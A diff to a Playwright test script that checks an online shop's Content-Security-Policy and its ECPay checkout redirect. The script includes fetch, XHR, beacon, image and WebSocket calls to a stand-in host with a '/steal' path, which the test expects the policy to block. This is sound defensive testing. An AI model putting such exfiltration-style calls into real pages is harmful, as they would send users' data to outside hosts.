@@ -57,6 +57,62 @@ const overflow = (page) => page.evaluate(() => {
 const shot = async (page, name) => { await page.waitForTimeout(250); await page.screenshot({ path: resolve(OUT, `${name}.png`), fullPage: true }); };
 const imagesLoaded = (page) => page.evaluate(() => [...document.images].filter((i) => i.getBoundingClientRect().width > 0).every((i) => i.complete));
 
+section('0b. D20: the CSP is pinned to the merchant origins (connect-src = the API only, img-src = the image origin only); another https origin is blocked in a real browser');
+{
+  const r = await fetch(SITE + '/');
+  const csp = r.headers.get('content-security-policy') || '';
+  const dir = (n) => (csp.split(';').map((s) => s.trim().split(' ')).find((a) => a[0] === n) || []).slice(1);
+  check('connect-src lists self + the API origin only (no https: / *)', JSON.stringify(dir('connect-src')) === JSON.stringify(["'self'", new URL(API).origin]), JSON.stringify(dir('connect-src')));
+  check('img-src lists self, data: and the image origin only (no https: / *)', dir('img-src').length === 3 && dir('img-src')[0] === "'self'" && dir('img-src')[1] === 'data:' && !dir('img-src').includes('https:') && !dir('img-src').includes('*'), JSON.stringify(dir('img-src')));
+  check('frame-src is none and form-action keeps only self + the two ECPay hosts', JSON.stringify(dir('frame-src')) === JSON.stringify(["'none'"]) && dir('form-action').length === 3, JSON.stringify([dir('frame-src'), dir('form-action')]));
+  const page = await open(1280, 800);
+  await page.goto(SITE + '/', { waitUntil: 'domcontentloaded' });
+  await page.waitForTimeout(500);
+  const probe = await page.evaluate(async () => {
+    const out = {}; const viol = [];
+    document.addEventListener('securitypolicyviolation', (e) => viol.push(e.effectiveDirective + ' ' + e.blockedURI));
+    // the page's own CSP applies to scripts a design layer could run: another https origin is refused, the API origin is not
+    try { await fetch('https://blocked-origin.example.test/steal?d=1', { mode: 'no-cors' }); out.fetch = 'allowed'; } catch (e) { out.fetch = 'blocked'; }
+    try { await new Promise((res, rej) => { const x = new XMLHttpRequest(); x.onerror = () => rej(new Error('blocked')); x.onload = res; x.open('GET', 'https://blocked-origin.example.test/x'); x.send(); }); out.xhr = 'allowed'; } catch (e) { out.xhr = 'blocked'; }
+    navigator.sendBeacon('https://blocked-origin.example.test/b', 'x');   // returns true when queued: the CSP violation event is the evidence
+    await new Promise((r) => setTimeout(r, 400));
+    out.beacon = viol.some((v) => v.startsWith('connect-src') && v.includes('/b')) ? 'blocked' : 'allowed';
+    out.img = await new Promise((res) => { const i = new Image(); i.onload = () => res('allowed'); i.onerror = () => res('blocked'); i.src = 'https://blocked-origin.example.test/p.gif'; });
+    out.ws = await new Promise((res) => { try { const w = new WebSocket('wss://blocked-origin.example.test/'); w.onopen = () => res('allowed'); w.onerror = () => res('blocked'); } catch (e) { res('blocked'); } });
+    out.internal = typeof (window.ShopCommerce || {})._internal;
+    out.frozenConfig = Object.isFrozen(window.SHOP_CONFIG);
+    return out;
+  });
+  check('fetch to another https origin is blocked by connect-src', probe.fetch === 'blocked', JSON.stringify(probe));
+  check('XMLHttpRequest to another https origin is blocked', probe.xhr === 'blocked', JSON.stringify(probe));
+  check('sendBeacon to another https origin is blocked', probe.beacon === 'blocked', JSON.stringify(probe));
+  check('an image ping to another https origin is blocked by img-src', probe.img === 'blocked', JSON.stringify(probe));
+  check('a WebSocket to another origin is blocked', probe.ws === 'blocked', JSON.stringify(probe));
+  check('ShopCommerce has no _internal handle and SHOP_CONFIG is frozen in the real page', probe.internal === 'undefined' && probe.frozenConfig === true, JSON.stringify(probe));
+  await page.context().close();
+}
+
+section('0c. D20: checkout reaches the ECPay form POST (stage host) with no CSP violation (the payments API answer is stubbed; the ECPay host is stubbed too)');
+{
+  const page = await open(1280, 800);
+  const cors = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': '*' };
+  await page.route('**/api/v1/shop/guest/order/payments', (route) => route.request().method() === 'OPTIONS'
+    ? route.fulfill({ status: 204, headers: cors })
+    : route.fulfill({ status: 201, contentType: 'application/json', headers: cors, body: JSON.stringify({ redirect_form: { method: 'POST', action: 'https://payment-stage.ecpay.com.tw/Cashier/AioCheckOut/V5', fields: { MerchantTradeNo: 'T1', CheckMacValue: 'x' } } }) }));
+  let posted = null;
+  await page.route('https://payment-stage.ecpay.com.tw/**', (route) => { posted = { method: route.request().method(), body: route.request().postData() || '' }; return route.fulfill({ status: 200, contentType: 'text/html', body: '<h1>stage ecpay</h1>' }); });
+  await page.goto(SITE + '/', { waitUntil: 'domcontentloaded' });
+  await page.evaluate(() => { window.__v = []; document.addEventListener('securitypolicyviolation', (e) => window.__v.push(e.effectiveDirective + ' ' + e.blockedURI)); });
+  await page.waitForTimeout(300);
+  const nav = page.waitForRequest((r) => r.url().startsWith('https://payment-stage.ecpay.com.tw/'), { timeout: 10000 }).catch(() => null);
+  await page.evaluate(async () => { const r = await window.ShopCommerce.checkout.startPayment('tok'); window.ShopCommerce.checkout.redirectToPayment(r); });
+  await nav;
+  await page.waitForTimeout(500);
+  check('the form was POSTed to the ECPay stage host', posted && posted.method === 'POST' && /MerchantTradeNo=T1/.test(posted.body), JSON.stringify(posted));
+  check('no CSP violation on the way (the page did not report one before leaving)', page.errors.filter((e) => /Content Security Policy|violates/.test(e)).length === 0, JSON.stringify(page.errors));
+  await page.context().close();
+}
+
 /* ---------------- desktop: the full journey ---------------- */
 section('desktop 1280: home, category list, product detail');
 {
